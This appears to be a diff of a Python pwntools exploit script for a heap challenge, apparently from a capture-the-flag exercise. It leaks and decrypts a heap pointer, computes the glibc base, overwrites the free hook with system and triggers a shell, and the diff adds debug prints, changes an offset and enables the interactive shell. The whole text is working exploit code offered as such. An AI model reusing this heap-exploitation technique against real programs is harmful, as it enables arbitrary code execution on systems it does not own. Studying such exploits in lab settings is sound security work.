@@ -53,8 +53,11 @@ def view(ind):
     return r1+r2+r3
 
 def readLeak(resp):
+    # print(f"resp: {resp}")
     rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+    # print(f"raw leak: {rawleak}")
     paddedleak = rawleak.ljust(8, b'\x00')
+    # print(f"padded leak: {paddedleak}")
     leak = pwn.u64(paddedleak)
     return leak
 
@@ -77,15 +80,16 @@ malloc(2, 1070) # malloc slightly larger chunk
 malloc(3, 24)
 malloc(4, 24)
 print("free-ing")
-free(0)
+# free(0)
 
 encrypted_leak = readLeak(view(0))
+print(f"leak (encrypted): {hex(encrypted_leak)}")
 leak = decrypt(encrypted_leak)
-print("leak:", hex(encrypted_leak), hex(leak))
+print(f"leak (decrypted): {hex(leak)}")
 
 
-
-glibc_base = leak - 0x7f09a85d5370
+offset = 0x35a4795c0 
+glibc_base = leak - offset 
 
 freehook_offset = 0x001e6e40
 
@@ -105,4 +109,4 @@ edit(11, pwn.p64(system_address))
 free(3)
 
 
-# p.interactive()
+p.interactive()
